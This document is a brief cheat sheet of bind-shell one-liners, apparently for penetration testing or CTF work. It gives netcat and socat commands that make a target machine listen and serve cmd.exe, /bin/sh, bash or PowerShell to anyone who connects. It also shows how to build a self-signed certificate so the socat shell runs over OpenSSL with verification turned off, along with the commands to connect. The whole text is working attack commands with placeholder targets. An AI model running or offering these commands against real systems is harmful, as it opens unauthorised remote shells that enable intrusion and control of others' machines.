# nc
```bash
# The target listen and prepare a shell for whoever connects
nc -lvnp TARGET_PORT -e "cmd.exe"
nc -lvnp TARGET_PORT -e "/bin/sh"
mkfifo /tmp/f; nc -lvnp TARGET_PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# Connect to shell
nc TARGET_IP TARGET_PORT
```

# socat
```bash
# The target listen and prepare a shell for whoever connects
socat TCP-L:TARGET_PORT EXEC:powershell.exe,pipes
socat TCP-L:TARGET_PORT EXEC:"bash -li"

# Connect to shell
socat TCP:TARGET_IP:TARGET_PORT -
```

# Encrypted shell with socat
```bash
# Create self-signed certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# Create our single pem file
cat shell.key shell.crt > shell.pem

# Listen with socat, the cert, and specify verify=0 to not verify whether the cert has been properly signed by a recognised authority.
socat OPENSSL-LISTEN:LISTENING_PORT,cert=shell.pem,verify=0 EXEC:powershell.exe,pipes
socat OPENSSL-LISTEN:LISTENING_PORT,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

# Connect to shell
socat OPENSSL:TARGET_IP:TARGET_PORT,verify=0 -
```